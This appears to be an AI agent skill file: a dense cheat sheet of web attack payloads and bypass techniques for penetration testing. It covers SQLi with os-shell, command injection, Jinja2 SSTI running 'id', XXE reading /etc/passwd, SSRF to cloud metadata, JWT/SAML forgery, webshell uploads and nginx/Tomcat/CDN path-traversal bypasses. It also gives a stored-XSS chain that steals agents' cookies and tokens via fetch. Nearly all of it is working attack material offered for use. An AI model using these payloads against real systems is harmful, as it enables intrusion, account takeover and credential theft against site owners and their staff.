---
name: web-attack-methods
description: >-
  Full-stack Web attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL, authentication JWT/OAuth/SAML, LFI/upload, Tomcat/WS/STOMP/XFF/PATH_INFO/CDN 502/web-host JS challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Web attack methods (injection / authentication / server-side / misc / CDN)

```
=== Web injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual test ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass SEL/**/ECT, mixed case, CHAR() | Escalate to OUTFILE → webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, bypass cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP chat: customer-service systems (OCS/LiveChat) commonly render visitor messages in the agent panel with innerHTML/v-html (Vue domProps innerHTML)
  Attack chain: visitor STOMP connection → send a message containing <img src=x onerror=fetch(...)> → agent opens the conversation → XSS executes in the agent's browser → steal cookie/token/localStorage
  Key point: the agent's browser can usually reach the internet (not bound by the backend's air-gap)! Payload goals: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: a message with mf:1 (visitor identity), tp:0 (text type) has its content go straight to innerHTML; image messages use the url field (<img src>) and skip innerHTML
SSRF: bypass IP 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication and authorization ===
Auth bypass: admin'-- | password reset (predictable token / Host header injection) | MFA bypass (skip / brute 4-6 digits) | X-Forwarded-For rotating IPs
IDOR: swap resource IDs for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none / RS256 → HS256) | -C brute weak secret | kid injection | jku/x5u remote key
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation (replacement/suffix/@-confusion/path traversal) | missing state → CSRF | PKCE downgrade | id_token wraps a JWT, full attack surface
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter read source | data:// expect:// phar:// | RCE chain: log poisoning / session poisoning / phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | .htaccess changes parsing | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator path traversal bypassing the authentication interceptor: the interceptor matches /api/* but actuator is whitelisted → /actuator/../api/v1/endpoint bypasses the interceptor and reaches the protected endpoint
  Principle: Spring Security / custom interceptors match paths before normalization, Tomcat routes after path normalization → path traversal slips past the interceptor but reaches the target Servlet
  Verify: /actuator/health returns 200 (whitelisted) → /actuator/../target path also returns 200 (bypass) vs direct /target returns 403/"sign is empty" (intercepted) | /actuator/health/../../target (template path {*path} traversal)
  sign-verification weakness: many custom sign checks only test that the header is non-empty (sign: any value + expTime: any digits passes) → finding code:500 rather than "sign is empty" = verification passed | quick check: sign:0 or sign:aaa changing from "sign is empty" to 500 = checks only non-empty
  Escalation: after bypass, combine X-HTTP-Method-Override: POST so a GET request triggers the POST handler (some Spring configurations support it)

=== Web misc ===
🚨Tomcat ..;/ bypassing nginx path restriction: nginx does not parse the ; in the URL (treats it as part of the path) but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allowed through) → Tomcat parses as /admin/path (traversal!)
  Verify: a normal /admin returns nginx 403, using /api/v1/v/..;/admin returns Tomcat 404 = bypass succeeded
  Limitation: Spring MVC DispatcherServlet routes independently of the file system; only same-war static files / non-MVC paths are reachable
  Combination: pair with a Spring4Shell-written JSP webshell, or reach actuator endpoints
🚨WebSocket/STOMP frames bypassing nginx method restriction: nginx returns 405 for POST /api/v1/a/login, but after a WebSocket upgrade STOMP frames are unrestricted:
  1. GET /api/v1/v/ws/{3 digits}/{8 random}/websocket → 101 Upgrade (going through the visitor path bypasses it)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → reaches the Spring backend directly
  SockJS XHR alternative: POST .../xhr_send sends a STOMP frame (204 = success), no true WebSocket needed
  Pitfall: CDN drops the connection quickly ("Another connection still open"); a raw socket is steadier than a websocket library
🚨X-Forwarded-For bypassing the application-layer IP blacklist: the CDN trusts the XFF header, the application takes the client IP from XFF for blacklist checks:
  Effective: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Ineffective: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detection: response contains {code:10010, msg:"blacklist"} and the data field is your real IP
🚨PATH_INFO nginx deny bypass: nginx denies .php files (returns a 146-byte nginx 404) but PHP-FPM still reaches them via PATH_INFO:
  /denied/file.php → 404|146 (nginx intercepts) | /denied/file.php/ → 16-byte "File not found." (PHP-FPM executed!)
  /denied/file.php/x → same as above. PHP-FPM returning "File not found." shows the request passed through the nginx deny and reached PHP-FPM (only the script path was wrong)
  Exploitation: if PHP has cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | once confirmed present, find the FPM's actual docroot (may differ from nginx's)
  Identification: nginx deny returns a fixed size (146-byte standard 404), PHP-FPM returns the 16-byte "File not found." → the size difference is the breakthrough signal
🚨Response-size fingerprinting (hidden file discovery): the CMS catch-all route returns a fixed-size homepage (e.g. 44004 bytes), a true nginx 404 returns 146 bytes
  File exists but denied: returns 146 bytes (nginx 404) | file does not exist: returns the catch-all size (44004 bytes) | → 146 bytes = the file really exists!
  Method: bulk-scan paths, classify by response size: catch-all = not present, nginx 404 = present but denied, other sizes = accessible
WAF bypass decision tree: encoding → protocol level → path → mutation → IP forgery → smuggling | CORS: Origin reflection + Credentials:true
🚨CDN 502 bypass (URL-pattern filtering): when the CDN returns 502 on admin paths, HTTP encoding / smuggling / method morphing all fail → change protocol:
  ①WebSocket upgrade: CDNs usually filter HTTP responses only; WS paths may be outside the filtering rules. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = the WS path is not filtered
  ②Find the origin IP and connect directly: DNS history / certificate transparency / SNI scanning / same-subnet sweeping / mail-header Return-Path / Shodan fingerprint matching / CDN origin configuration leaks / unique error-page fingerprint → bypass the CDN and hit the backend directly
  ③Non-standard ports: sweep the CDN node's full port range; some ports may proxy a different backend or different filtering rules (e.g. 8085 exposes actuator)
  ④Path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin though the CDN may not recognize it (note: the CDN may still filter the response)
  ⑤Wildcard-resolution identification: all subdomains resolving to the CDN = wildcard DNS, not real records. Compare results against 114.114.114.114/8.8.8.8
🚨WSCN/web-host CDN JS-challenge identification and bypass: a response containing `_jsc_ch_conf` + `ws_sec_page.js` = web-host JS challenge (not a WAF block)
  Traits: cv:".<domain>", mt:"jhsq987", chType/chTs/chID/chHash fields | the 403 page is 6000+ bytes containing "Embed Iframe"
  Bypass: the CDN only issues the challenge for certain whitelisted paths (e.g. /c/) → use the Spring Boot ..;/ traversal (`/c/..;/target_path`) to punch through to the backend's other routes
  Backend-framework identification: a JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = route exists but wrong method

=== CDN bypass (target hidden behind a CDN, admin interface gets 502) ===
CDN 502 analysis: distinguish URL-pattern filtering (timing fixed at ~0.3s, all methods/encodings/ports/nodes give 502) vs response-content filtering vs backend down
  Key judgment: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404 = pierced the CDN to the backend; a 502 = CDN URL-pattern interception
  nginx 502 vs CDN PWS 502: nginx = the edge-layer reverse proxy down, PWS = CDN global policy
```
